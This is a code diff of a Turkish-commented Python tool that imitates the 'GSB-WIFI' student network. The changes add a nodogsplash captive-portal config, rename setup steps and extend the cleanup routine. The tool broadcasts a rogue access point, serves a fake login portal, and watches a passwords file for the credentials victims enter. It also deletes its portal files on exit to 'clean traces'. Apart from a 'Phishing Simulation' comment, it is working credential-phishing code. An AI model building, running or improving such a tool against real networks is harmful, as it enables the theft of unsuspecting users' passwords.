@@ -12,12 +12,12 @@ from datetime import datetime
 GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0;36m', '\033[0m'
 LOG_FILE = "gsb_activity.log"
 PASS_FILE = "/etc/nodogsplash/passwords.txt"
+NDS_CONFIG = "/etc/nodogsplash/nodogsplash.conf"
 
-# --- DINAMIK YOLLAR (GitHub Uyumu) ---
+# --- DINAMIK YOLLAR ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 LOCAL_PORTAL = os.path.join(BASE_DIR, "portal_files")
 NDS_HTDOCS = "/etc/nodogsplash/htdocs"
-# Yeni klasör yapısına göre logger konumu
 LOGGER_PATH = os.path.join(NDS_HTDOCS, "backend/logger.py")
 
 print_lock = threading.Lock()
@@ -56,8 +56,8 @@ def check_dependencies():
         print(f"{YELLOW}[*] Yüklemek için: {NC}sudo apt update && sudo apt install {' '.join(missing)}")
         sys.exit(1)
 
-# --- YENI EKLEME: OTOMATIK KURULUM VE IP ---
-def setup_portal_step_1():
+# --- OTOMATIK PORTAL VE CONFIG KURULUMU ---
+def setup_portal_files():
     if not os.path.exists(LOCAL_PORTAL):
         print(f"{RED}[!] HATA: '{LOCAL_PORTAL}' klasörü bulunamadı!{NC}")
         sys.exit(1)
@@ -66,7 +66,52 @@ def setup_portal_step_1():
     subprocess.run(["sudo", "cp", "-a", f"{LOCAL_PORTAL}/.", NDS_HTDOCS], check=True)
     subprocess.run(["sudo", "chmod", "+x", LOGGER_PATH], stderr=subprocess.DEVNULL)
 
-def setup_portal_step_2(interface):
+def setup_nds_config(interface, gateway_ip="192.168.12.1"):
+    nds_config_template = f"""
+# GSB-WIFI Phishing Simulation Config
+GatewayInterface {interface}
+GatewayAddress {gateway_ip}
+MaxClients 250
+AuthIdleTimeout 120
+
+FirewallRuleSet authenticated-users {{
+    FirewallRule allow all
+}}
+
+FirewallRuleSet preauthenticated-users {{
+    FirewallRule allow tcp port 53
+    FirewallRule allow udp port 53
+    FirewallRule allow tcp port 8000
+    FirewallRule allow udp port 8000
+}}
+
+FirewallRuleSet users-to-router {{
+    FirewallRule allow udp port 53
+    FirewallRule allow tcp port 53
+    FirewallRule allow udp port 67
+    FirewallRule allow tcp port 22
+    FirewallRule allow tcp port 80
+    FirewallRule allow tcp port 443
+    FirewallRule allow tcp port 8000
+}}
+
+EmptyRuleSetPolicy authenticated-users passthrough
+EmptyRuleSetPolicy preauthenticated-users block
+EmptyRuleSetPolicy users-to-router block
+"""
+    try:
+        if not os.path.exists(NDS_CONFIG + ".bak"):
+            subprocess.run(["sudo", "cp", NDS_CONFIG, NDS_CONFIG + ".bak"], stderr=subprocess.DEVNULL)
+            
+        with open("temp_nds.conf", "w") as f:
+            f.write(nds_config_template)
+            
+        subprocess.run(["sudo", "mv", "temp_nds.conf", NDS_CONFIG], check=True)
+        safe_print(f"[*] Config Yapılandırıldı ({CYAN}{interface}{NC})")
+    except Exception as e:
+        safe_print(f"{RED}[!] HATA: Config oluşturulamadı: {e}{NC}")
+
+def setup_html_gateway_fix():
     try:
         output = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
         match = re.search(r"inet (192\.168\.[0-9]+\.[0-9]+)", output)
@@ -75,7 +120,7 @@ def setup_portal_step_2(interface):
         if os.path.exists(splash_file):
             sed_cmd = f"sudo sed -i -E 's/192\.168\.[0-9]+\.[0-9]+/{gateway}/g' {splash_file}"
             subprocess.run(sed_cmd, shell=True)
-            safe_print(f"[*] Portal Yapılandırıldı: {CYAN}{gateway}{NC} üzerinden dinleniyor.")
+            safe_print(f"[*] Portal Gateway Fix: {CYAN}{gateway}{NC}")
     except: pass
 
 def clean_exit(sig, frame):
@@ -83,24 +128,20 @@ def clean_exit(sig, frame):
     sys.stdout.flush()
     write_to_log("OPERASYON DURDURULDU.")
     DEVNULL = subprocess.DEVNULL
+    
     subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "fuser", "-k", "53/udp"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "fuser", "-k", "53/tcp"], stdout=DEVNULL, stderr=DEVNULL)
     
-    # IZLERI TEMIZLE
+    # IZLERI TEMIZLE & CONFIG GERI YUKLE
     subprocess.run(["sudo", "rm", "-rf", NDS_HTDOCS], stdout=DEVNULL, stderr=DEVNULL)
+    if os.path.exists(NDS_CONFIG + ".bak"):
+        subprocess.run(["sudo", "mv", NDS_CONFIG + ".bak", NDS_CONFIG], stdout=DEVNULL, stderr=DEVNULL)
     
-    subprocess.run(["sudo", "ip", "addr", "flush", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "ip", "addr", "add", "127.0.0.1/8", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "ip", "link", "set", "lo", "up"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
-    subprocess.run(["sudo", "systemctl", "reset-failed", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "systemctl", "start", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
     os.system('stty sane')
-    sys.stdout.write(f"{GREEN}[+] Bitti.{NC}\n")
+    sys.stdout.write(f"{GREEN}[+] Her şey eski haline getirildi. Bitti.{NC}\n")
     sys.stdout.flush()
     os._exit(0)
 
@@ -112,7 +153,6 @@ def get_interfaces():
         return re.findall(r"Interface\s+(.+)", output)
     except: return []
 
-# --- ESKİ FORMAT ŞİFRE İZLEYİCİSİ (GERİ GETİRİLDİ) ---
 def password_watcher():
     if not os.path.exists(PASS_FILE): open(PASS_FILE, 'a').close()
     with open(PASS_FILE, "r") as f:
@@ -128,59 +168,53 @@ def password_watcher():
 
 def run():
     check_dependencies()
-    setup_portal_step_1() # Dosyaları hazırla
+    setup_portal_files()
     
     ifaces = get_interfaces()
     all_sys_ifaces = os.listdir('/sys/class/net')
 
     os.system('clear')
-    write_to_log("--- YENİ OPERASYON BAŞLATILDI ---")
     print(f"{CYAN}=============================================={NC}")
-    print(f"{YELLOW}          GSB-WIFI YÖNETİCİ PANELİ             {NC}")
+    print(f"{YELLOW}          GSBWIFI OPERASYON PANELI             {NC}")
     print(f"{CYAN}=============================================={NC}")
 
     if args.interface:
         INTERFACE = args.interface
     else:
-        if not ifaces: return
+        if not ifaces: 
+            print(f"{RED}[!] Wi-Fi kartı bulunamadı!{NC}")
+            return
         for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
         idx1 = int(input("Yayın Kartı Seçin: ")) - 1
         INTERFACE = ifaces[idx1]
 
+    setup_nds_config(INTERFACE)
+
     INTERNET_INT = "lo"
     for iface in all_sys_ifaces:
-        if iface != INTERFACE and iface != "lo":
+        if iface != INTERFACE and iface != "lo" and not iface.startswith("veth"):
             INTERNET_INT = iface
             break
 
-    os.system('clear')
-    print(f"{CYAN}=============================================={NC}")
-    print(f"{YELLOW}          GSB-WIFI OPERASYON PANELI             {NC}")
-    print(f"{CYAN}=============================================={NC}")
     safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
     safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
     safe_print(f"[*] Kaynak: {YELLOW}{INTERNET_INT}{NC}")
 
     subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stderr=subprocess.DEVNULL)
-    subprocess.run(["sudo", "pkill", "-f", "logger.py"], stderr=subprocess.DEVNULL)
     
     cmd = ["sudo", "create_ap", "--no-virt", "-m", "nat", INTERFACE, INTERNET_INT, args.ssid]
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
 
     time.sleep(5) 
-    setup_portal_step_2(INTERFACE) # IP Tespiti ve HTML Fix
+    setup_html_gateway_fix()
     
-    # Logger'ı başlat (Yeni konumdan)
+    # Servisleri Başlat
     subprocess.Popen(["sudo", "python3", LOGGER_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
     subprocess.run(["sudo", "systemctl", "restart", "dnsmasq"], stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "pkill", "nodogsplash"], stderr=subprocess.DEVNULL)
     subprocess.Popen(["sudo", "nodogsplash"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    time.sleep(1)
     safe_print(f"{GREEN}[!] SİSTEM HAZIR. Dinleniyor...{NC}")
-    safe_print(f"{CYAN}----------------------------------------------{NC}", log_it=False)
-
     threading.Thread(target=password_watcher, daemon=True).start()
 
     while True:
